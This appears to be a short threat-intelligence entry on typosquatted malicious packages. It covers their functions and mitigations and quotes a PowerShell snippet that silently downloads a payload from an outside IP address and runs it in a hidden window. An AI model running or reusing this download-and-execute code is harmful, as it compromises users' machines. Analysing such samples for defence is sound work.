functionality: download and run additional malicious scripts
disable system security features such as firewalls or automatic updates
operational_techniques: typosquatting, where malicious actors create packages with names strikingly similar to legitimate ones to deceive developers
related_malicious_code_snippet:
$a = "<http://66.23.238.220/assets/images/icons/svg/x.bin>"
$y = "$env:temp//xxxxx.cmd"
$sleepTheGodFilePath = Join-Path $env:LocalAppData "Temp//SleepTheGod"
if (-not (Test-Path $sleepTheGodFilePath)) {
    New-Item -ItemType File -Path $sleepTheGodFilePath -Force | Out-Null
    Invoke-WebRequest -Uri $a -OutFile $y -ErrorAction SilentlyContinue | Out-Null
    Start-Process "cmd" "/c $y" -WindowStyle Hidden
}
mitigation_measures: avoid downloading packages from unverified publishers
use automated security tools to detect malicious packages
